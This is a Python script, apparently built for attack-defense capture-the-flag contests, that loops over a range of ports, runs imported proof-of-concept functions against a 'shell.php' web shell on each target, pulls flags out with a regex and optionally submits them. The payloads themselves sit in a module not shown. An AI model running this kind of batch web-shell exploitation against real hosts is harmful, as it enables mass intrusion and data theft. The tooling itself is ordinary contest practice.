#!/usr/bin/python3
# -*-coding:UTF-8-*-
import requests
import re
import os
from shutil import copyfile
from conf import settings, poc

"""
作用：批量利用POC并提交flag
"""

def exploitPOC(url, left, right):
    for i in range(int(left), int(right)+1):
        surl = url.format(i)
        # print(surl)
        try:
            # 根据情况切换函数
            # text = poc.poc1(surl)
            text = poc.poc2(surl)
            res = re.findall(settings.flagregexp, text)
            # 一般来说第一个匹配到的就是flag
            if res[0] != "":
                if settings.selfip in surl:
                    print('\033[0;32;48m[+] Exploit Success: ' + surl + '(self)\033[0m')
                else:
                    print('\033[0;32;48m[+] Exploit Success: ' + surl + '\033[0m')
                    with open(settings.flagpage, 'a+') as fp:
                        if res[0].encode() in compare:
                            print(f"\033[0;33;48m[*] {res[0]} has been writed in flag.txt\033[0m")
                            continue
                        fp.write(res[0])
                        fp.write('\n')
        except:
            pass

    print("\033[0;32;48m[+] Exploit End!\033[0m")

def sumbitFlag(url):
    with open(settings.flagpage, 'r') as fp:
        lines = fp.readlines()
    for line in lines:
        flag = line.replace('\r', '').replace("\n", '')
        # print(flag)
        # poc0 主要为提交flag服务
        text = poc.poc0(flagurl, flag)
        # 一般来说是JSON格式, 根据情况调整, 响应信息也是
        if "成功" in text:
            print('\033[0;32;48m[+] Submit Success\033[0m')
        else:
            print('\033[0;31;48m[+] Submit Failure\033[0m')

if __name__ == "__main__":
    # ip/port range
    # left, right = 0, 255
    left, right = 10001, 10005
    try:
        open(settings.flagpage, "r").read()
    except:
        fp = open(settings.flagpage, "a+")
        fp.close()
    copyfile(settings.flagpage, settings.flagpagebak)
    compare = open(settings.flagpagebak, "rb").read()
    # 放入shell路径批量扫并写入对应的方法和密码
    flagurl = ""
    url = "http://127.0.0.1:{}/shell.php"
    exploitPOC(url=url, left=left, right=right)
    os.unlink(settings.flagpagebak)
    # 选择是否提交flag
    # sumbitFlag(flagurl)

